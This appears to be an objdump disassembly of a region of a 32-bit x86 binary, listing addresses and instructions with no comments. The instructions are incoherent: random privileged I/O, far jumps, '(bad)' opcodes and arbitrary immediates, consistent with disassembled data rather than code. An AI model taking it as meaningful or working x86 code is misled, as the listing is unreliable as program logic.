  409202:	add    eax,0x34a55586
  409207:	jnp    0x40919e
  409209:	out    0x24,al
  40920b:	nop
  40920c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40920d:	push   cs
  40920e:	cwde   
  40920f:	add    eax,0x3d37558a
  409214:	sahf   
  409215:	sub    BYTE PTR [edx+0x36adeeb4],dl
  40921b:	push   ss
  40921c:	fidivr DWORD PTR [edi+0x72f2fc0c]
  409222:	sbb    esp,eax
  409224:	test   DWORD PTR [ebx],ebx
  409226:	or     dh,BYTE PTR [ecx+0xd]
  409229:	in     al,0xc
  40922b:	mov    eax,ds:0xdef21aac
  409230:	iret   
  409231:	nop
  409232:	adc    ebp,DWORD PTR [edi-0x3b]
  409235:	shl    DWORD PTR [ecx+0x1c10bb59],cl
  40923b:	es jae 0x409293
  40923e:	xor    eax,0x7ba4c473
  409243:	ss aas 
  409245:	or     BYTE PTR [edx+0x7312bba6],bh
  40924b:	dec    ecx
  40924c:	cmp    eax,0x4bee3e08
  409251:	test   eax,0x1978fabd
  409256:	mov    eax,ds:0xff602be1
  40925b:	xor    ah,dl
  40925d:	sub    cl,BYTE PTR [ebx+0x77e1927f]
  409263:	popf   
  409264:	out    dx,eax
  409265:	jmp    0x567:0x95dad84f
  40926c:	dec    edx
  40926d:	inc    ebp
  40926e:	cmc    
  40926f:	dec    edx
  409270:	jmp    0xd9a3:0x6f13b816
  409277:	aas    
  409278:	dec    esi
  409279:	mov    WORD PTR [ebx+0x51],?
  40927c:	pop    ebx
  40927d:	fld    QWORD PTR [ebx-0x16]
  409280:	dec    ebp
  409281:	pop    es
  409282:	adc    eax,0xf85a90f
  409287:	mov    bl,0xc
  409289:	(bad)  
  40928a:	push   ebx
  40928b:	push   ebx
  40928c:	xor    eax,0xe54e533
  409291:	data16 sahf 
  409293:	je     0x409229
  409295:	fld    TBYTE PTR [edx+0x44]
  409298:	int    0x31
  40929a:	add    BYTE PTR [ebx+0x1ea5dffc],0xa8
  4092a1:	inc    esi
  4092a2:	bound  edi,QWORD PTR [edx]
  4092a4:	aas    
  4092a5:	xor    esi,DWORD PTR [ebx]
  4092a7:	daa    
  4092a8:	out    dx,eax
  4092a9:	cli    
  4092aa:	xchg   esi,eax
  4092ab:	ret    0x6a5f
  4092ae:	or     eax,0xe5885d0f
  4092b3:	mov    WORD PTR gs:[esi],ds
  4092b6:	push   eax
  4092b7:	not    DWORD PTR [ebx]
  4092b9:	(bad)  
  4092ba:	pop    ebx
  4092bb:	cld    
  4092bc:	jmp    0x409324
  4092be:	lea    edx,ds:0xa2c0360b
  4092c4:	scas   al,BYTE PTR es:[edi]
  4092c5:	das    
  4092c6:	mov    al,es:0x8be53bf7
  4092cc:	adc    al,0xbf
  4092ce:	outs   dx,DWORD PTR ds:[esi]
  4092cf:	add    al,BYTE PTR [edx+0x4c11697b]
  4092d5:	and    al,0xe6
  4092d7:	fldcw  WORD PTR [ebx]
  4092d9:	xor    ebx,DWORD PTR ds:0x287b379
  4092df:	fisubr WORD PTR [ecx]
  4092e1:	jg     0x409296
  4092e3:	adc    ebp,DWORD PTR [ebx-0x5b]
  4092e6:	xchg   esp,eax
  4092e7:	push   edx
  4092e8:	sar    BYTE PTR [ecx+ebx*4-0x6404e204],1
  4092ef:	sahf   
  4092f0:	jp     0x409292
  4092f2:	add    al,0xa6
  4092f4:	(bad)  
  4092f5:	iret   
  4092f6:	pushf  
  4092f7:	add    ebx,DWORD PTR [edx+0x1e]
  4092fa:	lods   eax,DWORD PTR ds:[esi]
  4092fb:	push   edx
  4092fc:	(bad)  
  4092fd:	in     eax,dx
  4092fe:	fcmovnb st,st(3)
  409300:	dec    ebp
  409301:	xchg   ecx,eax
  409302:	jo     0x4092fd
  409304:	xor    ch,al
  409306:	in     al,0x76
  409308:	cmp    edi,DWORD PTR [ebx+0x3c44610a]
  40930e:	push   ss
  40930f:	add    ah,bh
  409311:	fmul   QWORD PTR [esi]
  409313:	dec    ecx
  409314:	add    al,0xdd
  409316:	add    BYTE PTR [ecx+0x25],0xfc
  40931a:	nop
  40931b:	xchg   bl,cl
  40931d:	enter  0x6d91,0x52
  409321:	loop   0x4092f0
  409323:	xor    al,BYTE PTR [edi]
  409325:	idiv   bh
  409327:	arpl   WORD PTR [edi-0x52053850],bp
  40932d:	push   edx
  40932e:	fwait
  40932f:	mov    dl,0xd9
  409331:	or     al,BYTE PTR [ecx+0x74b4e9de]
  409337:	(bad)  
  409338:	in     al,dx
  409339:	push   eax
  40933a:	pop    eax
  40933b:	neg    BYTE PTR [edi+0x40]
  40933e:	mov    gs,WORD PTR [ebp-0x72]
  409341:	pop    ds
  409342:	dec    esp
  409343:	mov    esp,0xd30d9663
  409348:	(bad)  
  409349:	xor    al,0xf6
  40934b:	dec    edi
  40934c:	jg     0x409315
  40934e:	adc    bl,bh
  409350:	jb     0x4093cf
  409352:	xchg   ebx,eax
  409353:	cmp    bh,bl
  409355:	push   eax
  409356:	mov    ebx,0x996af3c6
  40935b:	cmp    al,0xcf
  40935d:	mov    DWORD PTR [ebx+0x1d505e20],ebx
  409363:	repnz test BYTE PTR [edi+esi*8],cl
  409367:	cmp    DWORD PTR [ebx],esp
  409369:	or     ebx,DWORD PTR [edx-0x10]
  40936c:	cmp    esi,DWORD PTR [esi-0x53ac2c13]
  409372:	imul   ecx,DWORD PTR [ebx-0x5d],0xffffff91
  409376:	jecxz  0x409373
  409378:	(bad)  
  40937a:	mov    DWORD PTR [ecx-0xe93701d],esi
  409380:	or     al,0x21
  409382:	xor    BYTE PTR [edi+0x2b],bl
  409385:	call   0xfcb932
  40938a:	and    al,0x64
  40938c:	cmp    ch,BYTE PTR [edx+esi*4+0x1c]
  409390:	xchg   DWORD PTR [ecx+ebx*1-0x9181468],ecx
  409397:	test   eax,0xde9ff18e
  40939c:	xchg   DWORD PTR [ecx-0x1a],ebx
  40939f:	fist   DWORD PTR [ebx+eiz*8-0x1e]
  4093a3:	fmul   DWORD PTR [eax+0x5b8c7827]
  4093a9:	rol    BYTE PTR [edi-0x5f],0x2
  4093ad:	mov    ch,0x61
  4093af:	push   edx
  4093b0:	sub    al,0x38
  4093b2:	cdq    
  4093b3:	mov    eax,0x7db85d33
  4093b8:	es push ss
  4093ba:	sbb    BYTE PTR [ecx-0x3597f7e3],bl
  4093c0:	mov    BYTE PTR ds:0xacddfdeb,ch
  4093c6:	cli    
  4093c7:	test   BYTE PTR [edi+0x36],dl
  4093ca:	and    DWORD PTR [edx+eiz*8-0x13393d2c],ecx
  4093d1:	pop    ds
  4093d2:	mov    edi,DWORD PTR [edi+ecx*8]
  4093d5:	dec    di
  4093d7:	icebp  
  4093d8:	adc    DWORD PTR [edx+0x76],ebx
  4093db:	push   esi
  4093dc:	xchg   DWORD PTR [esi],ecx
  4093de:	mov    cl,0x62
  4093e0:	fwait
  4093e1:	or     dl,BYTE PTR [edi]
  4093e3:	cmp    ebx,DWORD PTR [edx]
  4093e5:	mov    ebp,0x55e5266d
  4093ea:	cli    
  4093eb:	pusha  
  4093ec:	out    0x67,eax
  4093ee:	sub    DWORD PTR [eax-0x1bb6db35],edi
  4093f4:	sbb    ebx,DWORD PTR [esi]
  4093f6:	js     0x40944e
  4093f8:	test   DWORD PTR [eax-0x6edc8338],ebp
  4093fe:	pop    ebx
  4093ff:	push   edx
  409400:	test   al,0xf8
  409402:	sbb    DWORD PTR [esi+ebp*8-0x65],ebp
  409406:	mov    eax,ds:0x4f5b146d
  40940b:	and    edx,ebx
  40940d:	xchg   edi,eax
  40940e:	pop    ss
  40940f:	mov    dh,0xde
  409411:	out    dx,al
  409412:	sub    eax,0x57678842
  409417:	aad    0x6b
  409419:	sub    esp,DWORD PTR [ecx-0x3e]
  40941c:	push   ds
  40941d:	xchg   ecx,eax
  40941e:	stc    
  40941f:	mov    esi,0xac1f607e
  409424:	ss jns 0x40949b
  409427:	mov    cs,WORD PTR [ecx-0x5741a40d]
  40942d:	sbb    esp,DWORD PTR [ebp-0x50]
  409430:	adc    al,0x80
  409432:	jne    0x409452
  409434:	hlt    
  409435:	push   edi
  409436:	jle    0x4093c7
  409438:	lods   eax,DWORD PTR ds:[esi]
  409439:	cmp    ecx,DWORD PTR [eax]
  40943b:	lock addr16 or eax,0x89c2c613
  409442:	or     BYTE PTR [eax+0x3b01e95],ah
  409448:	jns    0x40948f
  40944a:	imul   edi,DWORD PTR ds:0xb1465a3e,0x7154e74d
  409454:	dec    esp
  409455:	fiadd  DWORD PTR [ebx-0x9]
  409458:	jo     0x40941c
  40945a:	scas   eax,DWORD PTR es:[edi]
  40945b:	inc    edi
  40945c:	ror    bl,1
  40945e:	das    
  40945f:	jmp    0x40946a
  409461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409462:	or     al,0xf3
  409464:	loope  0x40941f
  409466:	test   al,0x9c
  409468:	xchg   ebp,eax
  409469:	stos   BYTE PTR es:[edi],al
  40946a:	or     esp,esp
  40946c:	das    
  40946d:	aas    
  40946e:	daa    
  40946f:	adc    BYTE PTR [ebx],dh
  409471:	add    eax,0x1551d7c5
  409476:	dec    edx
  409477:	fcomp  st(0)
  409479:	mov    al,ds:0xfed90280
  40947e:	sar    DWORD PTR [esi+0x18],0xf3
  409482:	mov    al,ds:0x8526b8a5
  409487:	jo     0x4094bb
  409489:	or     DWORD PTR [ecx-0x5f],ecx
  40948c:	lds    esp,FWORD PTR [esi]
  40948e:	loop   0x409474
  409490:	push   0x6f
  409492:	lods   al,BYTE PTR ds:[esi]
  409493:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  409495:	int3   
  409496:	sub    DWORD PTR [ecx],ebx
  409498:	retf   
  409499:	or     al,0xe
  40949b:	retf   0xbefe
  40949e:	mov    eax,ds:0x5a4d8e50
  4094a3:	hlt    
  4094a4:	call   0xef9ba276
  4094a9:	ja     0x409486
  4094ab:	jb     0x4094c7
  4094ad:	outs   dx,DWORD PTR ds:[esi]
  4094ae:	mov    al,BYTE PTR [edx]
  4094b0:	pusha  
  4094b1:	sub    eax,0xfd5b2758
  4094b6:	xor    BYTE PTR [ebx-0x5571d915],cl
  4094bc:	mov    DWORD PTR [ecx+0x25ea2fea],0x49698d67
  4094c6:	or     ebp,DWORD PTR ds:[edx+0x2bf8ad4e]
  4094cd:	adc    edi,DWORD PTR [eax-0x38]
  4094d0:	xor    DWORD PTR [esi-0x37],esp
  4094d3:	mov    ecx,0x73b89aa4
  4094d8:	adc    ch,bh
  4094da:	push   edx
  4094db:	out    dx,eax
  4094dc:	inc    ecx
  4094dd:	mov    eax,ds
  4094df:	sub    dh,0x3f
  4094e2:	mov    bl,0x17
  4094e4:	test   eax,0xd4dd90f8
  4094e9:	lods   eax,DWORD PTR ds:[esi]
  4094ea:	fsub   QWORD PTR [ebx-0x203a954d]
  4094f0:	stc    
  4094f1:	lock neg BYTE PTR [edi]
  4094f4:	ins    BYTE PTR es:[edi],dx
  4094f5:	addr16 inc ebx
  4094f7:	jmp    0x40952f
  4094f9:	jb     0x4094d8
  4094fb:	xchg   edx,eax
  4094fc:	xchg   DWORD PTR [esi],ebp
  4094fe:	shr    BYTE PTR [edx-0x70a03ba7],cl
  409504:	rcr    DWORD PTR [esi-0x4299fdb6],cl
  40950a:	mov    al,0x81
  40950c:	or     cl,BYTE PTR [esi]
  40950e:	(bad)  
  40950f:	mov    edi,DWORD PTR [ebp+0xf]
  409512:	add    eax,0x933cf13e
  409517:	sub    al,0x73
  409519:	fs xchg esp,eax
  40951b:	jge    0x409522
  40951d:	or     ah,BYTE PTR [ecx]
  40951f:	pop    ds
  409520:	int3   
  409521:	mov    eax,0x85213f3e
  409526:	cld    
  409527:	sbb    DWORD PTR [ebx-0x39f034a6],edx
  40952d:	(bad)  
  40952e:	jnp    0x409587
  409530:	cli    
  409531:	fwait
  409532:	mov    bh,0xe2
  409534:	sbb    eax,0xfe6025f8
  409539:	inc    ebx
  40953a:	(bad)  
  40953b:	lahf   
  40953c:	test   esp,edx
  40953e:	push   0x393eb404
  409543:	jns    0x40957d
  409545:	add    DWORD PTR [ebp+0x78ff9076],esp
  40954b:	mov    esi,0xbd4c9b79
  409550:	xchg   edi,eax
  409551:	push   ebx
  409552:	cmp    BYTE PTR [esi],bl
  409554:	adc    al,0xf
  409556:	rcl    DWORD PTR [ecx-0x70d46f2c],0xc0
  40955d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40955e:	test   DWORD PTR [edx],0x6f6e97b7
  409564:	sbb    DWORD PTR [edx-0x47],0x77e17a7c
  40956b:	cmp    eax,eax
  40956d:	inc    eax
  40956e:	pop    ds
  40956f:	xor    DWORD PTR [ebx+0x50],ebx
  409572:	mov    ah,0x3f
  409574:	jne    0x4095b9
  409576:	xor    al,0xb2
  409578:	push   eax
  409579:	xlat   BYTE PTR ds:[ebx]
  40957a:	and    ch,BYTE PTR [edx+0x2f8ace3]
  409580:	nop
  409581:	cdq    
  409582:	aaa    
  409583:	jmp    0xd0be:0x9091365b
  40958a:	sbb    eax,edi
  40958c:	mov    ch,0x9d
  40958e:	add    bl,BYTE PTR [ebx+0x1]
  409591:	mov    ch,dl
  409593:	test   al,0x17
  409595:	loop   0x409559
  409597:	or     ecx,DWORD PTR ds:0xff6e6a11
  40959d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40959e:	out    0x3d,eax
  4095a0:	push   ss
  4095a1:	inc    eax
  4095a2:	cs (bad) 
  4095a4:	push   0xffffffa2
  4095a6:	sub    cl,BYTE PTR [eax+0x2a2cda5e]
  4095ac:	fwait
  4095ad:	push   esi
  4095ae:	jg     0x40959d
  4095b0:	jge    0x409629
  4095b2:	mov    esi,0xa6360d3f
  4095b7:	jecxz  0x4095ff
  4095b9:	(bad)  [esi+0x2fe9b1a8]
  4095bf:	adc    ecx,ebp
  4095c1:	loope  0x4095e9
  4095c3:	push   0xea44d7d7
  4095c8:	sar    DWORD PTR [ecx+0x568153b6],1
  4095ce:	iret   
  4095cf:	push   edi
  4095d0:	fist   DWORD PTR [edi]
  4095d2:	inc    esp
  4095d3:	ins    DWORD PTR es:[edi],dx
  4095d4:	fist   DWORD PTR [di+0x4244]
  4095d9:	out    dx,eax
  4095da:	mov    bh,0xe3
  4095dc:	pop    esi
  4095dd:	dec    edx
  4095de:	dec    edx
  4095df:	inc    esp
  4095e0:	in     eax,dx
  4095e1:	popa   
  4095e2:	fisttp DWORD PTR [ebp+0x30]
  4095e5:	mov    ds:0xaea3429d,al
  4095ea:	call   0x6b17a452
  4095ef:	stc    
  4095f0:	mov    esp,0xb2007083
  4095f5:	xchg   edx,eax
  4095f6:	(bad)  
  4095f7:	push   ds
  4095f8:	fwait
  4095f9:	jne    0x40958a
  4095fb:	bound  eax,QWORD PTR [ebx+0xa]
  4095fe:	xchg   edi,eax
  4095ff:	sbb    al,0x80
  409601:	mov    ax,0xeb95
  409605:	jnp    0x4095c1
  409607:	push   cs
  409608:	leave  
  409609:	pop    ss
  40960a:	(bad)  
  40960b:	jno    0x40959c
  40960d:	adc    ah,BYTE PTR [ecx+ebp*1+0x38]
  409611:	xchg   BYTE PTR [edx-0x2a],dh
  409614:	mov    dh,0xe
  409616:	and    ah,cl
  409618:	and    DWORD PTR [ecx+0x29],esi
  40961b:	push   esi
  40961c:	hlt    
  40961d:	cmc    
  40961e:	xchg   ebx,eax
  40961f:	inc    esp
  409620:	lods   eax,DWORD PTR ds:[esi]
  409621:	push   es
  409622:	mov    esp,0xfa50682c
  409627:	retf   0x4494
  40962a:	jo     0x409614
  40962c:	mov    ds:0x92482ea7,eax
  409631:	js     0x4095be
  409633:	and    DWORD PTR [ecx-0x33],edi
  409636:	inc    ebp
  409637:	ds inc esp
  409639:	sbb    eax,0xe81be372
  40963e:	jb     0x409689
  409640:	int3   
  409641:	(bad)  
  409642:	sub    DWORD PTR [esi+0x39620564],edi
  409648:	imul   DWORD PTR [eax+ecx*2-0x76]
  40964c:	pop    esi
  40964d:	add    al,0x5d
  40964f:	(bad)  
  409650:	pushf  
  409651:	nop
  409652:	je     0x40965d
  409654:	or     eax,0x2fc9a819
  409659:	stos   BYTE PTR es:[edi],al
  40965a:	mov    al,ds:0xdfaf2a87
  40965f:	and    al,0x11
  409661:	mov    ah,0x44
  409663:	mov    ch,0x94
  409665:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409666:	mov    BYTE PTR [ecx],0xa3
  409669:	cld    
  40966a:	lods   eax,DWORD PTR ds:[esi]
  40966b:	sbb    al,0xeb
  40966d:	dec    eax
  40966e:	out    0x46,eax
  409670:	pop    edi
  409671:	pop    es
  409672:	mov    dh,BYTE PTR [esi-0x2b]
  409675:	or     edx,DWORD PTR [eax-0x5022293e]
  40967b:	div    BYTE PTR [esp+ebp*4]
  40967e:	lahf   
  40967f:	pop    ds
  409680:	arpl   WORD PTR [esi+0x2b],di
  409683:	pop    es
  409684:	scas   al,BYTE PTR es:[edi]
  409685:	out    dx,al
  409686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409687:	push   cs
  409688:	es mov ch,0xe2
  40968b:	cmp    dh,BYTE PTR [edi-0x47]
  40968e:	add    al,0x9c
  409690:	dec    edi
  409691:	inc    ebx
  409692:	xlat   BYTE PTR ds:[ebx]
  409693:	pop    es
  409694:	mov    ds:0xaa53b4e9,eax
  409699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40969a:	neg    BYTE PTR [eax+0x18]
  40969d:	pusha  
  40969e:	ret    0x7210
  4096a1:	inc    edx
  4096a2:	mov    dh,0xd8
  4096a4:	ret    
  4096a5:	inc    ebx
  4096a6:	mov    ah,0x91
  4096a8:	les    eax,FWORD PTR [ebx+0x47]
  4096ab:	sbb    al,0x67
  4096ad:	sbb    eax,0xa6b54771
  4096b2:	jbe    0x409665
  4096b4:	(bad)  
  4096b5:	cmp    al,0x58
  4096b7:	xchg   esp,eax
  4096b8:	test   esi,ebx
  4096ba:	ins    BYTE PTR es:[edi],dx
  4096bb:	cmp    eax,0x1c5d6041
  4096c0:	ffreep st(6)
  4096c2:	retf   
  4096c3:	mov    ds,WORD PTR [edi+ebp*2]
  4096c6:	je     0x4096e1
  4096c8:	in     al,dx
  4096c9:	lods   al,BYTE PTR ds:[esi]
  4096ca:	ret    0xb8b7
  4096cd:	or     eax,0xcfea08a9
  4096d2:	mov    esp,0xf7bc1748
  4096d7:	mov    esi,0x4df2dc59
  4096dc:	pop    ds
  4096dd:	mov    ecx,0x406f68f9
  4096e2:	jae    0x4096a5
  4096e4:	cwde   
  4096e5:	in     al,0xf8
  4096e7:	jg     0x40971c
  4096e9:	fbstp  TBYTE PTR [ecx+0x4df11816]
  4096ef:	sbb    eax,0x1edcad30
  4096f4:	(bad)  
  4096f5:	fucomi st,st(0)
  4096f7:	imul   ebx,DWORD PTR [edx-0x3550d3db],0xffffffce
  4096fe:	cs push cs
  409700:	call   0x1162:0x5969742
  409707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409708:	or     ebp,DWORD PTR [ecx]
  40970a:	push   eax
  40970b:	dec    eax
  40970c:	aam    0xd1
  40970e:	je     0x40977b
  409710:	outs   dx,DWORD PTR ds:[esi]
  409711:	sub    dh,dl
  409713:	mov    dl,0x51
  409715:	xor    al,0x4
  409717:	rcr    DWORD PTR ds:0xdb06ee0d,1
  40971d:	jae    0x4096bc
  40971f:	cmp    al,0xe3
  409721:	aaa    
  409722:	pop    ss
  409723:	(bad)  
  409724:	dec    esi
  409725:	inc    edx
  409726:	test   eax,0xf8992a1a
  40972b:	xchg   edi,eax
  40972c:	sbb    dh,BYTE PTR [esi+ecx*8+0x6f]
  409730:	and    DWORD PTR [esi-0x6f],esp
  409733:	pop    es
  409734:	nop
  409735:	adc    DWORD PTR [esi],edi
  409737:	pop    esp
  409738:	jmp    0xa87557e5
  40973d:	popf   
  40973e:	pop    ebp
  40973f:	fisub  WORD PTR [eax+0x1e]
  409742:	cdq    
  409743:	pop    ecx
  409744:	sbb    eax,0xe5d7274
  409749:	call   esp
  40974b:	loopne 0x4096d6
  40974d:	ja     0x40970d
  40974f:	xchg   ebx,eax
  409750:	std    
  409751:	mov    al,ds:0x2a87e133
  409756:	sbb    al,0x1d
  409758:	call   0x452:0xa72f5157
  40975f:	outs   dx,DWORD PTR ds:[esi]
  409760:	test   BYTE PTR [esi],ch
  409762:	mov    ch,0x63
  409764:	lahf   
  409765:	mov    esp,?
  409767:	imul   ecx,DWORD PTR [eax+0x17],0xffffffb7
  40976b:	stc    
  40976c:	push   0x5cc0984d
  409771:	cmp    dl,BYTE PTR ds:0x26f3dc33
  409777:	outs   dx,BYTE PTR ds:[esi]
  409778:	jne    0x4097b6
  40977a:	or     ah,bl
  40977c:	push   edx
  40977d:	mov    DWORD PTR [edi+0x1c],esi
  409780:	dec    eax
  409781:	jmp    0x6a0fbd87
  409786:	mov    ds:0xe06383ea,eax
  40978b:	imul   ebp,DWORD PTR [ebx+0x7db7a5d0],0xc9382ff4
  409795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409796:	sti    
  409797:	rol    BYTE PTR [ebp-0x51],cl
  40979a:	loop   0x4097b8
  40979c:	sti    
  40979d:	add    eax,0xb6c3b7de
  4097a2:	test   al,0x36
  4097a4:	pop    esi
  4097a5:	and    al,0x91
  4097a7:	xchg   DWORD PTR [edi+edi*1-0xe],edi
  4097ab:	push   0xffffffbf
  4097ad:	loopne 0x4097c5
  4097af:	out    dx,eax
  4097b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097b1:	inc    ecx
  4097b2:	stos   BYTE PTR es:[edi],al
  4097b3:	jp     0x409751
  4097b5:	imul   edi,DWORD PTR [eax+eiz*8+0xe],0x32ea3e10
  4097bd:	loopne 0x409777
  4097bf:	xchg   edx,eax
  4097c0:	ins    BYTE PTR es:[edi],dx
  4097c1:	sbb    eax,0xd28ebd82
  4097c6:	xor    bh,0xdf
  4097c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097ca:	xor    DWORD PTR [eax+0x7f],esp
  4097cd:	push   eax
  4097ce:	lock mov ebx,eax
  4097d1:	je     0x40983e
  4097d3:	cmp    bl,ch
  4097d5:	adc    BYTE PTR [edx],cl
  4097d7:	cdq    
  4097d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097d9:	add    eax,0x42d10dd
  4097de:	push   edx
  4097df:	jp     0x409787
  4097e1:	pop    edx
  4097e2:	and    BYTE PTR [ebp-0x4],ch
  4097e5:	and    BYTE PTR [eax+0x28],bl
  4097e8:	pushf  
  4097e9:	jb     0x4097cf
  4097eb:	and    eax,0x20e4138f
  4097f0:	push   edi
  4097f1:	pushf  
  4097f2:	dec    ecx
  4097f3:	pop    ss
  4097f4:	mov    edx,0x79f76a11
  4097f9:	neg    ebp
  4097fb:	sbb    BYTE PTR [edx-0x3c],cl
  4097fe:	scas   al,BYTE PTR es:[edi]
  4097ff:	sbb    esp,ebx
  409801:	(bad)  
  409803:	in     al,0xcc
  409805:	pop    ebp
  409806:	sub    al,0x45
  409808:	(bad)  
  409809:	test   al,0x15
  40980b:	inc    edi
  40980c:	xchg   esi,eax
  40980d:	xor    BYTE PTR [ecx],bl
  40980f:	popf   
  409810:	test   BYTE PTR [ebx+0x13185501],0xb6
  409817:	or     ch,BYTE PTR [esi-0x2d30919d]
  40981d:	cli    
  40981e:	cmp    eax,0x37a89801
  409823:	mov    ecx,0x34edf45e
  409828:	retf   
  409829:	addr16 ja 0x4097b8
  40982c:	retf   
  40982d:	cli    
  40982e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40982f:	ss jg  0x4097e3
  409832:	pop    ebp
  409833:	std    
  409834:	repnz scas eax,DWORD PTR es:[edi]
  409836:	in     al,0x23
  409838:	inc    esp
  409839:	xor    eax,0xa68c5a83
  40983e:	xchg   ebp,eax
  40983f:	shl    ecx,1
  409841:	sub    BYTE PTR [esi-0x59],bl
  409844:	test   al,0x6a
  409846:	loop   0x4097fc
  409848:	out    dx,al
  409849:	mov    bl,0x65
  40984b:	add    al,0xa1
  40984d:	cmp    BYTE PTR [esi+0x48ee2b8a],cl
  409853:	mov    cl,BYTE PTR [edx+0x2f]
  409856:	sub    al,0x6d
  409858:	push   edx
  409859:	or     ah,BYTE PTR cs:[esi+0x75]
  40985d:	ret    0x57bc
  409860:	dec    ebp
  409861:	loop   0x4098de
  409863:	movaps XMMWORD PTR [edi],xmm7
  409866:	mov    esp,0xa8f9b2fd
  40986b:	jb     0x4098c4
  40986d:	int    0x1c
  40986f:	rcr    BYTE PTR [ecx-0x5892b1e8],cl
  409875:	sub    dh,BYTE PTR [ebx+0x7def70e4]
  40987b:	mov    eax,0xaeb07ea5
  409880:	arpl   WORD PTR [esi+0x2d],ax
  409883:	cmp    BYTE PTR [ebp-0x70],dh
  409886:	and    BYTE PTR [esi],dl
  409888:	repz push ss
  40988a:	add    esi,DWORD PTR [eax+ebp*4-0x287cc47d]
  409891:	mov    ebp,0x69de2fdb
  409896:	fs dec esi
  409898:	mov    ch,0xbb
  40989a:	ins    BYTE PTR es:[edi],dx
  40989b:	adc    dl,ch
  40989d:	mov    dl,0x52
  40989f:	mov    al,ds:0xe1c77b4c
  4098a4:	sub    al,0x3b
  4098a6:	addr16 aad 0x2d
  4098a9:	icebp  
  4098aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098ab:	pop    ds
  4098ac:	mov    al,0x61
  4098ae:	push   edx
  4098af:	stos   DWORD PTR es:[edi],eax
  4098b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098b1:	xor    edx,DWORD PTR [edx-0x30733fa]
  4098b7:	adc    esi,DWORD PTR [ebp+0x45687ddf]
  4098bd:	(bad)  
  4098be:	sub    esp,0xfffffffa
  4098c1:	icebp  
  4098c2:	mov    ebx,0x6c7c84a7
  4098c7:	push   edx
  4098c8:	repz in eax,0x2
  4098cb:	mov    dh,0xf7
  4098cd:	icebp  
  4098ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098cf:	ffree  st(6)
  4098d1:	fistp  QWORD PTR [eax+0x2f3973c2]
  4098d7:	adc    bl,BYTE PTR [esp+ebx*1]
  4098da:	pop    es
  4098db:	adc    ebx,DWORD PTR [ebx]
  4098dd:	push   ecx
  4098de:	sar    BYTE PTR [ebx+0x1c09fb54],1
  4098e4:	sar    DWORD PTR ds:0xcc61053b,1
  4098ea:	sub    al,0xdf
  4098ec:	fistp  DWORD PTR [esi-0x14befe87]
  4098f2:	jmp    0x5f39:0xb49e2784
  4098f9:	stc    
  4098fa:	pop    ss
  4098fb:	repnz div BYTE PTR [ebx+0x13d98f36]
  409902:	xchg   ebx,eax
  409903:	in     eax,dx
  409904:	enter  0xb91a,0xdc
  409908:	fild   QWORD PTR [esi-0x46]
  40990b:	and    BYTE PTR [ecx+eiz*4-0x52037c04],bh
  409912:	(bad)  
  409913:	into   
  409914:	inc    eax
  409915:	jb     0x40998e
  409917:	and    ebx,DWORD PTR [ebp+0x1a]
  40991a:	pushf  
  40991b:	sbb    edx,DWORD PTR [ecx+0x10]
  40991e:	in     al,dx
  40991f:	xchg   edi,eax
  409920:	mov    esp,0x1a8bf890
  409925:	inc    edx
  409926:	(bad)  
  409927:	push   ss
  409928:	mov    ah,0xad
  40992a:	(bad)  
  40992b:	repz sar DWORD PTR [eax+edx*2],0xd4
  409930:	scas   al,BYTE PTR es:[edi]
  409931:	adc    BYTE PTR [edi],0x2d
  409934:	add    edx,eax
  409936:	xor    BYTE PTR [edi+0x44],ah
  409939:	add    DWORD PTR [edi+edi*2+0x14a7df12],0xfbd4061
  409944:	aas    
  409945:	xor    BYTE PTR [edi+0x9],cl
  409948:	div    ecx
  40994a:	adc    DWORD PTR [ecx-0x144d40bd],edx
  409950:	std    
  409951:	sar    DWORD PTR [eax-0x7],1
  409954:	div    DWORD PTR [edx]
  409956:	adc    DWORD PTR [ecx-0x316dd1ba],esi
  40995c:	dec    edi
  40995e:	jmp    0x4099be
  409960:	fcmovnbe st,st(6)
  409962:	dec    ecx
  409963:	dec    edx
  409964:	mov    edi,0x8454b63a
  409969:	imul   eax,DWORD PTR ds:0x48b3a973,0x90ed5409
  409973:	xor    eax,0x7838f6dd
  409978:	jg     0x40996a
  40997a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40997b:	add    al,BYTE PTR [edi]
  40997d:	(bad)  
  40997e:	out    0xf5,eax
  409980:	mov    ds:0x6248e1d8,eax
  409985:	mov    edi,0xd0be8874
  40998a:	fisubr WORD PTR [ebx-0x1e0616d7]
  409990:	cmp    esi,ebp
  409992:	jns    0x409947
  409994:	das    
  409995:	test   al,0xe1
  409997:	mov    dh,0x8e
  409999:	in     eax,0x5a
  40999b:	push   ebx
  40999c:	mov    ds:0x6135ae85,eax
  4099a1:	xor    DWORD PTR [esi+0x47348e9],0x4ac34782
  4099ab:	ret    
  4099ac:	xor    edi,ecx
  4099ae:	pop    edx
  4099af:	cmp    bl,BYTE PTR [eax+0x2417e0d]
  4099b5:	in     eax,0x73
  4099b7:	dec    esp
  4099b8:	mov    esp,0xffee288e
  4099bd:	lahf   
  4099be:	(bad)  
  4099bf:	push   cs
  4099c0:	enter  0xc98c,0x2b
  4099c4:	test   al,0xc9
  4099c6:	xchg   ebx,eax
  4099c7:	sbb    edi,DWORD PTR [esi+0x18]
  4099ca:	dec    esp
  4099cb:	push   esp
  4099cc:	mov    al,ds:0x6415931b
  4099d1:	push   edx
  4099d2:	inc    ecx
  4099d3:	or     DWORD PTR [ecx],esp
  4099d5:	int3   
  4099d6:	pop    ebx
  4099d7:	(bad)  
